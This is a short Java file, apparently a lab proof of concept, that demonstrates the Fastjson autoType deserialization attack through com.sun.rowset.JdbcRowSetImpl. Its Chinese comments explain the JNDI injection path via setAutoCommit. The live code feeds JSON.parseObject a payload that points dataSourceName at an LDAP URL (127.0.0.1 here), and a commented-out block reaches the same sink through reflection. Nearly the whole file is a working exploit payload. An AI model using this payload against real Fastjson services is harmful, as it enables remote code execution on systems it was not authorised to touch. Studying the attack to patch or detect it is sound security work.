package com.mechoy;

import com.alibaba.fastjson.JSON;
import com.sun.rowset.JdbcRowSetImpl;

import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.lang.reflect.Field;
import java.sql.SQLException;

public class fastjsonTest1 {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, SQLException, NamingException {
        // com.sun.rowset.JdbcRowSetImpl.connect 该方法中存在JNDI注入
        // com.sun.rowset.JdbcRowSetImpl.setAutoCommit 在该方法中调用了connect
        // setAutoCommit:是public,没有static修饰
        // setAutoCommit:参数数量为1，返回值为void
//        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
//        Class<?> superclass = jdbcRowSet.getClass().getSuperclass();
//        Field dataSource = superclass.getDeclaredField("dataSource");
//        dataSource.setAccessible(true);
//        dataSource.set(jdbcRowSet,"ldap://127.0.0.1:8085/YTUsllNt");    // JNDI注入的东西
//
//        jdbcRowSet.setAutoCommit(true);

        String s = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:8888/pbbLLAew\",\"AutoCommit\":\"true\"}";
        JSON.parseObject(s);
    }
}
